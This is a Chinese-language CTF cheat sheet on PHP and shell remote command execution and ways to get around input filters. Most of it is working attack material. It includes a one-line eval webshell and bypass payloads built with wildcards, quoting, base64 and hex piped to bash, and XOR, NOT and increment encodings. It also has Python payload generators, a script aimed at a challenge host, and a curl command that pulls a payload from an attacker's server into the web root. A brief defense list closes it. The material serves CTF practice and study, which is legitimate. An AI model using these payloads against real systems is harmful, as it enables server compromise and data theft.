---
title: RCE
author: Creexile
date: 2024-03-08
lastMod: 2025-12-12
summary: '命令执行利用和绕过'
cover: ''
category: 'CTF'
draft: false
comments: false
sticky: 0
tags: [RCE]
---

# RCE简介

RCE即命令执行, 利用已知漏洞或功能点执行任意命令

## 利用方向

多和文件上传结合, 因为有了shell才有执行的可能; 如今在代码层面由于代码审计的完善, 不再出现一眼就能看出来的/可以利用的RCE了

可能也就CTF打打了, 除非是CVE之类的

- 继承服务器权限读写文件/执行系统命令
- 反弹shell

## 利用场景

- ping
- DNS请求
- Office文档
- 框架漏洞
- 逻辑漏洞
- 文件上传后续

## 前置知识

### 管道符

| 管道符 | 描述                     |
| ------ | ------------------------ |
| ;      | AB都执行                 |
| \&     | AB都执行                 |
| \&\&   | A为真时执行B             |
| \|     | 显示B执行结果            |
| \|\|   | A为假时执行B,否则只执行A |

### 可利用函数

| 函数             | 使用例                                                                                                                |
| ---------------- | --------------------------------------------------------------------------------------------------------------------- |
| preg_replace()   | `Preg_replace("/(.*)/e",'\\1',$_GET['a']);`<br />`Preg_replace("/\[(.*)\]/e",'\\1',$_GET['a']);`<br />传入a=phpinfo() |
| assert()         | `assert($_GET['a']);`                                                                                                 |
| eval()           | `eval($_GET['a']);`                                                                                                   |
| call_user_func() | `call_user_func($_GET['a'],$_GET['b']);`                                                                              |
| \$a(\$b)         | 前system后ls                                                                                                          |
| system           | ls,whomai,cat...                                                                                                      |
| exec             | 无回显,和echo等同时用,与system相同                                                                                    |
| shell_exec       | 同上                                                                                                                  |
| passthru         | 同system                                                                                                              |
| popen            | `popen("whoami >> 1.txt".'r');`                                                                                       |
| 反引号           | echo \`whoami\`                                                                                                       |

### 可能用到的

可能的命令

```php
// 一句话木马
@eval($_POST['cmd']);
// 当前位置
print(__FILE__);
// 尝试读文件
var_dump(file_get_contents('c:\windows\system32\drivers\etc\hosts'));
// 写马
echo "<php phpinfo();?>" > phpinfo.php
// 查看文件
type c:\windows\system32\drivers\etc\hosts
```

可能的例子

```php
// 如果源码:
var_dump(file_get_contents($_POST[1],$_POST[2]));
// 尝试写shell
1=shell.php&2=<?php phpinfo()?>
```

## RCE相关漏洞

- Spring WebFlow 远程代码执行(CVE-2017-4971)
- S2-053 远程代码执行

# 绕过

## 过滤字符

### 过滤空格

代替空格:

```
<
<>
%20(空格)
%09(tab)
$IFS$9
${IFS}
$IFS
{cat,/flag}	(这是可以用的吗?)
```

### 过滤下划线

下划线`_`被过滤，如果是再php8以下，变量名中的第一个非法字符`[`会被替换为下划线`_`

```
N[S.S等效于N_S.S
php需要接收e_v.a.l参数,给e[v.a.l传参即可
```

### 过滤部分符号

不需要引号也可以利用GET/POST传参, 甚至过滤数字/左尖括号/小括号/等号/冒号都能用这个; 直接变为文件包含

其实就是将闭合语句, 文件包含和php伪协议结合

```
# 读文件
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
# 写文件, 过滤就用base64编码
?c=include$_GET["a"]?>&a=data://text/plain,<?php%20phpinfo();?>
# 甚至包含日志
?c=include$_GET["a"]?>&a=/var/log/nginx/access.log
```

### 过滤目录分隔符

`DIRECTORY_SEPARATOR` 是 PHP 内置常量, 表示系统目录分隔符, 如果在linux中, 我们可以用它来读取根目录

```
print_r(scandir(DIRECTORY_SEPARATOR));
var_dump(scandir(DIRECTORY_SEPARATOR));
```

既然如此, 就可以切换到根目录然后读取flag:

```
chdir(DIRECTORY_SEPARATOR);readfile(flag);
```

当然, 如果flag不在根目录, 那就用`cd`进入然后在读取即可

### 特殊情况

1. 过滤`=`的时候, `a=1`中这个等号是传参作用而不是字符, 不会被过滤
2. 正则表达式里面是中文符号

## 过滤字符串

### 反斜杠绕过

主要是应对对预过滤关键词, 在关键词中插入反斜杠即可

```shell
c\at /flag
l\s /
```

### 拼接绕过

```
cat /flag
# 变为
b=ag;cat /fl\$b
```

### 引号绕过

```php
//如cat、ls被过滤
ca""t /flag
l's' /
```

### 通配符绕过

```php
//如flag被过滤
cat /f???
cat /fl*
cat /f[a-z]{3}
```

### 编码绕过

```php
//base64编码绕过,编码cat /flag，反引号、| bash、$()用于执行系统命令
`echo Y2F0IC9mbGFn | base64 -d`
echo Y2F0IC9mbGFn | base64 -d | bash
$(echo Y2F0IC9mbGFn | base64 -d)

//hex编码绕过，编码cat /flag,| bash用于执行系统命令
echo '636174202f666c6167' | xxd -r -p | bash

//shellcode编码
//十六进制编码
```

### 反引号绕过

反引号里面的东西会被当作命令执行

```php
// 等效于打开ls目录下的文件
cat `ls`
```

### 取反绕过

有更为完善的脚本, 只展示原理

```php
//取反传参
<?php

$a = "system";
$b = "cat /flag";

$c = urlencode(~$a);
$d = urlencode(~$b);

//输出得到取反传参内容
echo "?cmd=(~".$c.")(~".$d.");"
?>
```

### 异或绕过

```python
# 异或构造Python脚本
valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "

answer = input('输入异或构造的字符串:')

tmp1, tmp2 = '', ''
for c in answer:
    for i in valid:
        for j in valid:
            if ord(i) ^ ord(j) == ord(c):
                tmp1 += i
                tmp2 += j
                break
        else:
            continue
        break

print(f'"{tmp1}"^"{tmp2}"')
```

### 管道符绕过

比如剩下了`|`, 可以写个程序绕过;

```python
import urllib.parse

# 定义要构造的字符串
str1 = ["system", "cat flag.php"]

# 有效字符直接定义为字符串
valid_chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz^+~$[]{}&-'

for target in str1:
    t1, t2 = '', ''
    for k in target:
        for i in valid_chars:
            for j in valid_chars:
                hex_i = urllib.parse.quote(i)
                hex_j = urllib.parse.quote(j)
                # 使用按位或运算符构造字符
                if chr(ord(urllib.parse.unquote(hex_i)) | ord(urllib.parse.unquote(hex_j))) == k:
                    t1 += hex_i
                    t2 += hex_j
                    break
            else:
                continue
            break
    print(f"(\"{t1}\"|\"{t2}\")")
```

### 更换函数绕过

```php
# 我在最前面写了可利用函数都算
system -> passthru
# 读取根目录
c=eval(var_dump(scandir('/')););
# 读文件
c=eval(var_dump(file_get_contents($_POST['a'])););&a=/flag
c=echo file_get_contents("flag.php");
c=readfile("flag.php");
c=var_dump(file('flag.php'));
c=highlight_file("flag.php");
c=show_source("flag.php");
# 一行一行读取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}
# 一行一个一个字符取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;}
# 一行一行读取
c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}
# 文件包含加伪协议
```

### cat替换

这个单独拿出来讲, 因为确实多

| 命令    | 作用                                  |
| ------- | ------------------------------------- |
| tac     | 与cat相反,按行反向输出                |
| more    | 按页显示,用于文件内容多且不能滚动屏幕 |
| less    | 和more类似                            |
| tail    | 查看文件末几行                        |
| head    | 查看文件首几行                        |
| nl      | cat加上行号                           |
| od      | 二进制方式读文件                      |
| xxd     | 二进制方式读文件,同时由可读字符显示   |
| sort    | 排序文件                              |
| uniq    | 报告或删除文件的重复行                |
| file -f | 报错文件内容                          |
| grep    | 过滤查找字符串                        |

> 附
>
> ```shell
> od -A d -c /flag	转入可读字符
> grep flag /flag	查找字符串
> ```

### 闭合语句绕过

```php
// php标签闭合绕过
// 如果还需要在该程序内, 利用;等闭合即可
?> <?= phpinfo(); ?>
<?= phpinfo(); ?> <?
```

### 回溯过限绕过

```php
// php正则回溯次数大于1000000次返回False
$a = 'hello world'+'h'^1000000
preg_match("/hello.*world/is",$a) == False
```

## 无回显

函数执行结果无回显, 可以外带/写文件/反弹shell

```shell
// 无回显RCE，如exec()函数，可将执行结果输出到文件再访问文件
ls / | tee 1.txt
cat /flag | tee 2.txt
eval(print`c\at /flag`;)
```

## 限定后缀/限定部分命令

限定后缀名, 一般是`%00`截断, 闭合或者是注释掉后面的内容

限定部分命令:

```php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
```

可以利用换行符, 管道符等让其不执行或输出后执行

```
?c=cat flag.php || # 理论上 ;, |, ||, &, &&都可以用
?c=cat flag.php%0a
```

## 函数处理

输入会经过一些函数的处理, 使得直接构造无效化

1. `ob_get_contents()`函数

在前面虽然有命令执行, 如果我用这个函数获取缓冲区内容, 将所有字符替换为问号呢(此时输出全是问号)

首先可以利用`exit();`截断

```
c=include('/flag.txt');exit(0);
c=var_export(scandir("/"));exit();	# 根目录
```

还可以反向操作:

```python
import requests

url = "http://c5ec61c2-5fd3-4973-8277-71d0522d966d.challenge.ctf.show/"

d = {'c': 'include("/flag.txt");echo ~ob_get_contents();'}
s = requests.post(url, d).content

for i in s:
    print(chr(~i & 0xff), end='')
```

## 无权限

设置`open_basedir()`, 限制`ini_set()`

```php
<?php
$a=new DirectoryIterator("glob:///*");
foreach($a as $f){
    echo($f->__toString().' ');
}
exit(0);?>
```

## 限制长度

一般结合其他语言, 但是执行的还是bash命令, 也放在这里了

[命令注入长度限制绕过](https://www.cnblogs.com/-chenxs/p/11981586.html)

```php
$code = $_POST['code'];
if(strlen($code) < 8){
    system($code);
}
```

## 极端情况

### 无参数绕过

```
getallheaders()、get_defined_vars()、session_id
```

### 自增绕过

无字母无数字

```php
//自增payload，assert($_POST[_]),命令传入_

$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);&_=phpinfo();
```

### 临时文件绕过

原理:
Linux主要存储在 /tmp/ 目录下, 格式通常是 /tmp/php[ 6个随机字符 ]
Windows主要存储在 C:/Windows/ 目录下，格式通常是 C:/Windows/php[ 4个随机字符 ].tmp

在自己的服务器上写一个命令执行的 txt ,然后整到靶机上

```shell
 curl http://your_vps/1.txt > /var/www/html/1.php
```

然后尝试访问

```shell
?cmd=?><?=`/??p/p?p??????`;
```

还有一种更极端的: 没有上传点, 但是也有解决方法, 只要是PHP网站都可以用上传(默认行为), 可以自己构造上传界面

> 相关题目为ctfshow web55

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>POST数据包POC</title>
  </head>
  <body>
    <form
      action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/"
      method="post"
      enctype="multipart/form-data"
    >
      <!--链接是当前打开的题目链接-->
      <label for="file">文件名：</label>
      <input type="file" name="file" id="file" /><br />
      <input type="submit" name="submit" value="提交" />
    </form>
  </body>
</html>
```

见P神文章[无字母数字webshell之提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

> 这种方法同样适用于PHP5的时候构造无字母(因为PHP5并不像PHP7支持`($a)();`这样的方法来执行动态函数, 也就是不支持取反异或等操作)

### 无字母绕过

可能还一起过滤部分字符, 我认为你还是太极端了; 这种一般用的异或、取反、自增、临时文件上传

### 无数字绕过

1. 利用`/bin/`目录下的`base64`进行通配符匹配, 获得flag.php文件的base64编码

```
?c=/???/????64 ????.???
```

2. 利用`/usr/bin/`下的`bzip2`命令，先将flag.php文件进行压缩, 然后再将其下载

```
?c=/???/???/????2 ????.???
```

3. 临时文件上传

### 极端正则

1. `|.*f.*l.*a.*g.*|`这种过滤就是字母不能按过滤的顺序出现,

这个时候利用通配符和各种替代即可

```
# /bin下可以利用对应文件执行对应指令, 利用这点绕过
?c=/bin/?at${IFS}f???.php
```

2. 只剩下部分符号, 比如剩下$和括号

`$(())`的运算, 以及[shell中各种括号\(\)、\(\(\)\)、\[\]、\[\[\]\]、\{\}的作用和区别](https://blog.csdn.net/u013402321/article/details/80333272)

```
# 这是一个构造36的payload
?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
```

简单来说，`$(())` 用来做数学运算, 其中`$((${_}))=0`, `$((~$((${_}))))=-1`, 所以我们是拼接出-37在进行取反

## 其他方法

1. FFI(Foreign Function Interface), 即外部函数接口

FFI指在一种语言里调用另一种语言代码的技术; PHP的FFI扩展就是一个让你在PHP里调用C代码的技术, php7.4以上才有, [php官方解析](https://www.php.net/manual/zh/ffi.cdef.php)

```php
$ffi = FFI::cdef("int system(const char *command);");	//创建一个system对象
$a='/readflag > 1.txt';	//没有回显，所以将内容输出到1.txt
$ffi->system($a);	//通过$ffi去调用system函数
```

2. 切片

系统内置变量的切片, 可以切出我们想要的字符, 下面是`nl`命令

```
${PATH:~Q}${PWD:~Q} ????.???
```

其中, `~`是从字符串末尾开始切片, 我们只需要最后那个字母, 所以只需要`~0`; 而任意的大小写字母与数字0等效, 选一个可用的字母即可

还有另一种利用类似`sizeof()`获取数字的:

`${#var}`的语法用于获取变量 `var` 的长度, 其实就是将这些数字应用到切片中去，绕过对数字的过滤

```
${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
```

3. 文件名

有些网站会执行`file xxx.jpg`, 报错为ascii text,with no line terminators

这时候将文件命名为截断命令的格式, 例如`apple;ls -a`

但是这里你会发现`.`是用不了的, 换成通配符可以解决这一个问你

# 防御

1. 尽量不执行外部命令
2. 自定义函数替代外部命令
3. escapeshellarg函数处理
   将任何引起参数或命令结束的字符转义
4. `saft_mode_exec_dir` //指定执行程序的主目录
   `safe_mode = On` // 打开php的安全模式
   `safe_mode_exec_dir = /usr/local/php/bin/`
